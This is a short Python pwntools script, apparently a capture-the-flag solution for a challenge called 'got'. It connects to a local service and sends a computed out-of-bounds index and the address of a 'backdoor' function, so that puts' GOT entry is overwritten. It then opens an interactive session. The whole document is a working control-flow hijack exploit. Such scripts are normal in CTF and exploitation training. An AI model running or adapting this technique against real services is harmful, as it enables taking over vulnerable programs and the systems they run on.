from pwn import *

# r = process('../got/share/got')
r = remote('127.0.0.1', 10002)

value = 0x404080
puts_got = 0x404000
backdoor = 0x401166

offset = (puts_got - value) // 8
r.sendlineafter(b'Enter a index to store a value: \n', str(offset).encode())
r.sendlineafter(b'Enter a value: \n', str(backdoor).encode())
r.interactive()
